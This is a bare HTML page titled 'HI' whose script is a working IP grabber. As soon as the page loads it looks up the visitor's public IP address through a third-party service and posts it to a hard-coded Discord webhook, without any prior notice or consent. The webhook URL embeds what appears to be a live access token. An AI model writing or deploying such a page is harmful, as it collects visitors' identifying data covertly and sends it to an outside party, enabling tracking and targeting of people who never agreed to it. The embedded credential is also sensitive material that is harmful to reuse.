<!DOCTYPE html>
<html>
<head>
    <title>HI</title>
</head>
<body>
    <script>
        // Function to send IP address to Discord webhook
        function sendIPToWebhook() {
            // Get the user's IP address using a free service
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    
                    // Construct the payload
                    const payload = {
                        content: `User IP: ${ipAddress}`
                    };

                    // Make a POST request to the Discord webhook
                    fetch('https://discord.com/api/webhooks/1234480011193483356/ObM_OYrW-7_ujLYBXHlleFE9gXSxMLiG6UnV9jvPiiXYAwtCN13ZPG6o4n8Cgie9xR8M', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Failed to send IP address to webhook');
                        }
                        alert('IP address sent to Discord webhook successfully!');
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Failed to send IP address to Discord webhook');
                    });
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Failed to retrieve IP address');
                });
        }

        // Call the function to send IP on page load (optional)
        sendIPToWebhook();
    </script>
</body>
</html>
